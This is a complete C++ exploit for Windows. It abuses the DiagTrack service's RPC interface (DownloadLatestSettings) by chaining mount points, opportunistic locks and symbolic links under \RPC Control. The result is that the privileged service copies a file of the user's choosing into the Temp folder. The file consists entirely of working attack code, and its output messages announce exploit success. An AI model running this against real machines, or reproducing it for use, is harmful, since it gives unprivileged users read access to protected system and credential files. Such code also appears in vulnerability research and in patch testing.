
#include <iostream>
#include <rpc.h>
#include <strsafe.h>
#include <Shlobj.h> // SHGetKnownFolderPath()
#include <shlwapi.h> // PathFindFileName() 

// Common Utils
#include "CommonUtils.h"
#include "ReparsePoint.h"
#include "FileOpLock.h"
#include "FileSymlink.h"

#include "DiagTrack1_h.h"

#pragma comment(lib, "rpcrt4.lib")
#pragma comment(lib, "Shlwapi.lib") // PathFindFileName() 

#define DEBUG FALSE

// Functions 
RPC_STATUS CreateBindingHandle(LPCWSTR pwszUuid, RPC_BINDING_HANDLE* phBinding);
RPC_STATUS CloseBindingHandle(RPC_BINDING_HANDLE* phBinding);
BOOL PrepareWorkspace();
BOOL GetCDMDirectory();
DWORD WINAPI ThreadTriggerDiagTrack(LPVOID lpParam);
void HandleOplock1();
void HandleOplock2();
void Cleanup();

// Global variables 
RPC_BINDING_HANDLE g_hBinding = INVALID_HANDLE_VALUE;
WCHAR* g_pwszTargetFile = NULL;
WCHAR* g_pwszTargetFileCopy = NULL;
WCHAR* g_wszWorkspaceDir = NULL;
WCHAR* g_arrBaitFiles[3];
WCHAR* g_wszCdmDir = NULL;
HANDLE g_hSymlinkBait2 = INVALID_HANDLE_VALUE;
HANDLE g_hSymlinkBait3 = INVALID_HANDLE_VALUE;
BOOL g_bSuccess = FALSE;

int wmain(int argc, wchar_t* argv[])
{
	if (argc != 2)
	{
		wprintf(L"Usage: %ls <C:\\PATH\\TO\\TARGET\\FILE>\n", argv[0]);
		return 1;
	}

	g_pwszTargetFile = argv[1];
	if (DEBUG) { wprintf(L"[DEBUG] Target file: %ls\n", g_pwszTargetFile); }


	HRESULT hRes;

	hRes = CreateBindingHandle(L"4c9dbf19-d39e-4bb9-90ee-8f7179b20283", &g_hBinding);
	if (FAILED(hRes))
	{
		wprintf(L"[-] Failed to create binding handle.\n");
		return 2;
	}

	wprintf(L"[*] RPC connection OK\n");

	// This call isn't mandatory but makes the exploit more reliable.
	hRes = DownloadLatestSettings(g_hBinding, 1, 1);
	if (FAILED(hRes))
	{
		wprintf(L"[-] DownloadLatestSettings() failed (Err: 0x%08X)\n", hRes);
		return 3;
	}

	wprintf(L"[*] DiagTrack service OK\n");

	if (!PrepareWorkspace())
	{
		wprintf(L"[-] Failed to create workspace.\n");
		Cleanup();
		return 4;
	}

	if (DEBUG) { wprintf(L"[DEBUG] Using Workspace Directory: '%ls'.\n", g_wszWorkspaceDir); }

	wprintf(L"[*] Workspace OK\n");


	if (!GetCDMDirectory())
	{
		wprintf(L"[-] Failed to get CDM directory.\n");
		Cleanup();
		return 5;
	}

	if (DEBUG) { wprintf(L"[DEBUG] Found CDM directory: '%ls'.\n", g_wszCdmDir); }


	HANDLE hThreadTriggerDiagTrack = INVALID_HANDLE_VALUE;
	DWORD dwThreadId = 0;

	// Create mount point
	//   C:\Users\[...]\LocalState\Tips -> C:\Users\[...]\Temmp\workspace
	if (ReparsePoint::CreateMountPoint(g_wszCdmDir, g_wszWorkspaceDir, L""))
	{
		if (DEBUG) { wprintf(L"[DEBUG] Created mountpoint: %ls -> %ls\n", g_wszCdmDir, g_wszWorkspaceDir); }

		// Set an OpLock on the first XML file 
		//   C:\Users\[...]\Temp\workspace\bait1.xml 
		FileOpLock* oplock1 = FileOpLock::CreateLock(g_arrBaitFiles[0], L"", HandleOplock1);
		wprintf(L"[*] OpLock 1 set on '%ls'.\n", g_arrBaitFiles[0]);
		if (oplock1)
		{
			// Trigger DiagTrack 
			wprintf(L"[*] Triggering DiagTrack...\n");
			hThreadTriggerDiagTrack = CreateThread(NULL, 0, ThreadTriggerDiagTrack, NULL, 0, &dwThreadId);

			oplock1->WaitForLock(INFINITE);
			
			FileOpLock* oplock2 = FileOpLock::CreateLock(g_arrBaitFiles[2], L"", HandleOplock2);
			wprintf(L"[*] OpLock 2 set on '%ls'.\n", g_arrBaitFiles[2]);

			wprintf(L"[*] Releasing Oplock 1.\n");
			delete oplock1;

			if (oplock2)
			{
				oplock2->WaitForLock(INFINITE);

				wprintf(L"[*] Releasing Oplock 2.\n");
				delete oplock2;
			}

			if (hThreadTriggerDiagTrack && dwThreadId != 0)
			{
				WaitForSingleObject(hThreadTriggerDiagTrack, INFINITE);
			}

			ReparsePoint::DeleteMountPoint(g_wszCdmDir);
		}
	}
	else
	{
		wprintf(L"[-] ReparsePoint::CreateMountPoint('%ls') failed (Err: %d).\n", g_wszCdmDir, ReparsePoint::GetLastError());
	}

	if (g_bSuccess)
	{
		wprintf(L"[+] Exploit successfull. Target file was copied to: '%ls'\n", g_pwszTargetFileCopy);
	}
	else
	{
		wprintf(L"[-] Exploit failed.\n");
	}

	Cleanup();

	return 0;
}

BOOL PrepareWorkspace()
{
	DWORD dwRet = 0;

	WCHAR wszTempPathBuffer[MAX_PATH];

	dwRet = GetTempPath(MAX_PATH, wszTempPathBuffer);
	if (dwRet > MAX_PATH || (dwRet == 0))
	{
		wprintf_s(L"[-] GetTempPath() failed (Err: %d).\n", GetLastError());

		ZeroMemory(wszTempPathBuffer, MAX_PATH);
		StringCchPrintf(wszTempPathBuffer, MAX_PATH, L"C:\\workspace");
	}
	else
	{
		if (wszTempPathBuffer[wcslen(wszTempPathBuffer) - 1] != '\\')
		{
			StringCchCat(wszTempPathBuffer, MAX_PATH, L"\\");
		}
		StringCchCat(wszTempPathBuffer, MAX_PATH, L"workspace");
	}

	g_wszWorkspaceDir = (WCHAR*)malloc(MAX_PATH * sizeof(WCHAR));
	if (g_wszWorkspaceDir)
	{
		StringCchPrintf(g_wszWorkspaceDir, MAX_PATH, L"%ls", wszTempPathBuffer);

		if (!CreateDirectory(g_wszWorkspaceDir, nullptr))
		{
			dwRet = GetLastError();
			if (dwRet == ERROR_ALREADY_EXISTS)
			{
				wprintf_s(L"[!] The directory '%ls' already exists.\n", g_wszWorkspaceDir);
			}
			else
			{
				wprintf_s(L"[-] CreateDirectory('%ls') failed (Err: %d).\n", g_wszWorkspaceDir, dwRet);
			}
			return FALSE;
		}
	}

	for (int i = 0; i < 3; i++)
	{
		HANDLE hFile;
		DWORD dwBytesToWrite;
		DWORD dwBytesWritten = 0;

		const char* szFileContent = "test";

		g_arrBaitFiles[i] = (WCHAR*)malloc(MAX_PATH * sizeof(WCHAR));

		if (g_arrBaitFiles[i])
		{
			StringCchPrintf(g_arrBaitFiles[i], MAX_PATH, L"%ls\\bait%i.xml", g_wszWorkspaceDir, i + 1);

			hFile = CreateFile(g_arrBaitFiles[i], GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
			if (hFile == INVALID_HANDLE_VALUE)
			{
				wprintf_s(L"[-] Failed to create file '%ls'.\n", g_arrBaitFiles[i]);
				return FALSE;
			}

			dwBytesToWrite = (DWORD)strlen(szFileContent);

			if (!WriteFile(hFile, szFileContent, dwBytesToWrite, &dwBytesWritten, NULL))
			{
				wprintf_s(L"[-] Failed to write '%ls'\n", g_arrBaitFiles[i]);
				return FALSE;
			}

			CloseHandle(hFile);
		}
	}

	return TRUE;
}

BOOL GetCDMDirectory()
{
	LPWSTR pwszLocalAppData;
	HRESULT hRes;

	hRes = SHGetKnownFolderPath(FOLDERID_LocalAppData, KF_FLAG_DEFAULT, NULL, &pwszLocalAppData);
	if (FAILED(hRes))
	{
		wprintf(L"[-] SHGetKnownFolderPath() failed (Err: 0x%08X)\n", hRes);
		return FALSE;
	}

	g_wszCdmDir = (WCHAR*)malloc(MAX_PATH * sizeof(WCHAR));
	if (g_wszCdmDir)
	{
		StringCchPrintf(g_wszCdmDir, MAX_PATH, L"%ls\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\LocalState\\Tips", pwszLocalAppData);

		if (GetFileAttributes(g_wszCdmDir) == INVALID_FILE_ATTRIBUTES)
		{
			wprintf(L"[!] CDM directory '%ls' doesn't exist.\n", g_wszCdmDir);
			return FALSE;
		}

		// Delete all files in directory if any
		//https://stackoverflow.com/questions/32060534/how-to-use-deletefile-with-wildcard-in-c
		WCHAR wszWildcardPath[MAX_PATH];
		StringCchPrintf(wszWildcardPath, MAX_PATH, L"%ls\\*", g_wszCdmDir);
		WIN32_FIND_DATAW fd;
		WCHAR wszTempPath[MAX_PATH];
		HANDLE hFind = FindFirstFile(wszWildcardPath, &fd);
		if (hFind != INVALID_HANDLE_VALUE)
		{
			do
			{
				StringCchPrintf(wszTempPath, MAX_PATH, L"%ls\\%ls", g_wszCdmDir, fd.cFileName);
				DeleteFile(wszTempPath);
			} while (FindNextFileW(hFind, &fd));
			FindClose(hFind);
		}
	}

	return TRUE;
}

DWORD WINAPI ThreadTriggerDiagTrack(LPVOID lpParam)
{
	HRESULT hRes;

	hRes = DownloadLatestSettings(g_hBinding, 1, 1);
	if (SUCCEEDED(hRes))
	{
		//wprintf(L"[+] DownloadLatestSettings() OK\n");
		return 0;
	}

	return 1;
}

void HandleOplock1()
{
	wprintf(L"[+] OpLock 1 triggered. Switching mountpoint and creating symlinks.\n");

	ReparsePoint::DeleteMountPoint(g_wszCdmDir);

	const WCHAR* wszBaseObjDir = L"\\RPC Control";
	WCHAR wszTempPath[260];

	ReparsePoint::CreateMountPoint(g_wszCdmDir, wszBaseObjDir, L"");

	if (DEBUG) { wprintf_s(L"[DEBUG] Created mountpoint: '%ls' -> '%ls'.\n", g_wszCdmDir, wszBaseObjDir); }

	StringCchPrintf(wszTempPath, MAX_PATH, L"\\??\\%ls", g_pwszTargetFile);
	g_hSymlinkBait2 = CreateSymlink(nullptr, L"\\RPC Control\\bait2.xml", wszTempPath);
	if (DEBUG) { wprintf(L"[DEBUG] Created symlink: %ls -> %ls\n", L"\\RPC Control\\bait2.xml", wszTempPath); }

	StringCchPrintf(wszTempPath, MAX_PATH, L"\\??\\%ls", g_arrBaitFiles[2]);
	g_hSymlinkBait3 = CreateSymlink(nullptr, L"\\RPC Control\\bait3.xml", wszTempPath);
	if (DEBUG) { wprintf(L"[DEBUG] Created symlink: %ls -> %ls\n", L"\\RPC Control\\bait3.xml", wszTempPath); }
}

void HandleOplock2()
{
	wprintf(L"[+] OpLock 2 triggered. Copying target file.\n");

	LPWSTR pwszFilename;
	HRESULT hRes;

	pwszFilename = PathFindFileName(g_pwszTargetFile);

	if (pwszFilename != g_pwszTargetFile)
	{
		LPWSTR pwszProgramData;

		hRes = SHGetKnownFolderPath(FOLDERID_ProgramData, KF_FLAG_DEFAULT, NULL, &pwszProgramData);
		if (SUCCEEDED(hRes))
		{
			WCHAR wszCopyFromPath[MAX_PATH];
			StringCchPrintf(wszCopyFromPath, MAX_PATH, L"%ls\\Microsoft\\Diagnosis\\SoftLandingStage\\bait2.xml", pwszProgramData);

			WCHAR wszTempPath[MAX_PATH];
			GetTempPath(MAX_PATH, wszTempPath);

			WCHAR wszCopyToPath[MAX_PATH];
			StringCchPrintf(wszCopyToPath, MAX_PATH, L"%ls\\copy_%ls", wszTempPath, pwszFilename);

			if (DEBUG) { wprintf(L"[DEBUG] Target file: '%ls'\n", wszCopyFromPath); }

			if (CopyFile(wszCopyFromPath, wszCopyToPath, FALSE))
			{
				g_bSuccess = TRUE;
				g_pwszTargetFileCopy = (WCHAR*)malloc(MAX_PATH * sizeof(WCHAR));
				if (g_pwszTargetFileCopy)
				{
					StringCchCopy(g_pwszTargetFileCopy, MAX_PATH, wszCopyToPath);
				}
			}
			else
			{
				wprintf(L"[-] CopyFile() failed (Err: %d).\n", GetLastError());
			}
		}
		else
		{
			wprintf(L"[-] SHGetKnownFolderPath() failed (Err: 0x%08X)\n", hRes);
		}
	}
	else
	{
		wprintf(L"[-] PathFindFileName() failed.\n");
	}
}

void Cleanup()
{
	if (g_pwszTargetFileCopy != NULL)
	{
		free(g_pwszTargetFileCopy);
	}

	if (g_hSymlinkBait2 != INVALID_HANDLE_VALUE)
	{
		CloseHandle(g_hSymlinkBait2);
	}

	if (g_hSymlinkBait3 != INVALID_HANDLE_VALUE)
	{
		CloseHandle(g_hSymlinkBait3);
	}
	
	if (g_wszCdmDir != NULL)
	{
		free(g_wszCdmDir);
	}

	for (int i = 0; i < 3; i++)
	{
		if (g_arrBaitFiles[i] != NULL)
		{
			if (GetFileAttributes(g_arrBaitFiles[i]) != INVALID_FILE_ATTRIBUTES)
			{
				DeleteFile(g_arrBaitFiles[i]);
			}
			free(g_arrBaitFiles[i]);
		}
	}

	if (g_wszWorkspaceDir != NULL)
	{
		if (GetFileAttributes(g_wszWorkspaceDir) != INVALID_FILE_ATTRIBUTES)
		{
			RemoveDirectory(g_wszWorkspaceDir);
		}
		free(g_wszWorkspaceDir);
	}

	if (g_hBinding != INVALID_HANDLE_VALUE)
	{
		CloseBindingHandle(&g_hBinding);
	}
}

RPC_STATUS CreateBindingHandle(LPCWSTR pwszUuid, RPC_BINDING_HANDLE* phBinding)
{
	RPC_WSTR stringBinding;
	RPC_STATUS rpcStatus;

	rpcStatus = RpcStringBindingCompose((RPC_WSTR)pwszUuid, (RPC_WSTR)L"ncalrpc", nullptr, nullptr, nullptr, &stringBinding);
	if (rpcStatus == RPC_S_OK)
	{
		if (DEBUG) { wprintf(L"[DEBUG] RpcStringBindingCompose() OK\n"); }

		rpcStatus = RpcBindingFromStringBinding(stringBinding, phBinding);
		if (rpcStatus == RPC_S_OK)
		{
			if (DEBUG) { wprintf(L"[DEBUG] RpcBindingFromStringBinding() OK\n"); }
		}
		else
		{
			wprintf(L"[-] RpcBindingFromStringBinding() failed (Err: 0x%08X)\n", rpcStatus);
		}

		rpcStatus = RpcStringFree(&stringBinding);
		if (rpcStatus == RPC_S_OK)
		{
			if (DEBUG) { wprintf(L"[DEBUG] RpcStringFree() OK\n"); }
		}
		else
		{
			wprintf(L"[-] RpcStringFree() failed (Err: 0x%08X)\n", rpcStatus);
		}
	}
	else
	{
		wprintf(L"[-] RpcStringBindingCompose() failed (Err: 0x%08X)\n", rpcStatus);
	}

	return rpcStatus;
}

RPC_STATUS CloseBindingHandle(RPC_BINDING_HANDLE* phBinding)
{
	RPC_STATUS rpcStatus;

	rpcStatus = RpcBindingFree(phBinding);
	if (rpcStatus == RPC_S_OK)
	{
		if (DEBUG) { wprintf(L"[DEBUG] RpcBindingFree() OK\n"); }
	}
	else
	{
		wprintf(L"[-] RpcBindingFree() failed (Err: 0x%08X)\n", rpcStatus);
	}

	return rpcStatus;
}

extern "C" void __RPC_FAR * __RPC_USER midl_user_allocate(size_t len)
{
	return(malloc(len));
}

extern "C" void __RPC_USER midl_user_free(void __RPC_FAR * ptr)
{
	free(ptr);
}